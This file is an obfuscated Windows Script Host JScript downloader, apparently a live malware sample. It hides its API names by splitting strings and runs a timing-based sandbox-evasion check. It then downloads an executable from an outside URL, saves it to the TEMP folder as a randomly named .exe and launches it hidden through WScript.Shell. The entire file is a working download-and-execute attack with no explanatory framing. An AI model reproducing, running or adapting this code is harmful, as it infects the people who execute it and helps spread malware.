var SC = false;
var BO = "Create"+"Object";
var KG = function X() {return WScript[BO]("WScript"+".Shell");}(), E0 = 11;
var K = "MSXML2"+".XMLHTTP";
var Z = 2;
var GK = Z - 2;
function S(RD){KG["Run"](RD, GK, GK);};
function Q(){return K + "";};
function BL(M0, FU){GK = GK * 1; return M0 - FU;};
function G(){return BO;};
/*@cc_on
  @if (@_win32 || @_win64)
    SC = true;
  @end
@*/
if (SC)
{
var G0 = "";
function O(){return 22;};
var CN0 = 0; var W0 = 0;
function H()
{
var CN = new this["Date"]();
var W = CN["getUTCMilliseconds"]();
WScript["Sleep"](O());
var CN = new this["Date"]();
var P = CN["getUTCMilliseconds"]();
WScript["Sleep"](O());
var CN = new this["Date"]();
var D = CN["getUTCMilliseconds"]();
var CN0 = "Y";
CN0 = BL(P, W);
var W0 = "A";
W0 = BL(D, P);
G0 = "open";
return BL(CN0, W0);
}
var DO = false;
var S0 = false;
for (var R = GK; R < O() * 1; R++){if (H() != GK){
DO = true; 
W0 = "31" + 11 * CN0 + W0; 
S0 = true; 
break;
}}
function E() {return ((DO == true) && (DO == S0)) ? 1 : GK;};
if (DO && E() && S0){
function QP() {return KG["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "eEYG4Q0MQodxtRa2.ex" + "e";};
 E1 = Q();
 W1 = WScript[BO](E1);
 var J = 1;
do { 
	for (;J;){
	try {
		if (J == 1)
		{
			W1[G0]("GET", "http://vtdrive.kz/f6dh1a", false);
			W1["send"]();
			D0 = "Sleep";
			J = 2;
		}
		WScript[D0](O() + 120); 
		if (W1["readystate"] < 2 * 2) continue;
		J = GK;
		function IN(RG) {var JG = (1, 2, 3, 4, 5, RG); return JG;};
		IC = WScript[G()]("ADODB.Stream");
		E1 = IC;
		E1[G0]();
		E1["type"] = IN(1);
		E1["write"](W1["ResponseBody"]);
		IC["position"] = IN(GK);
		E1["Save" + "ToFile"](QP(), 2);
		IC["cl"+"ose"]();
		O0 = QP();
		S(O0);
	} catch(M){};};
}while (J);
}
}

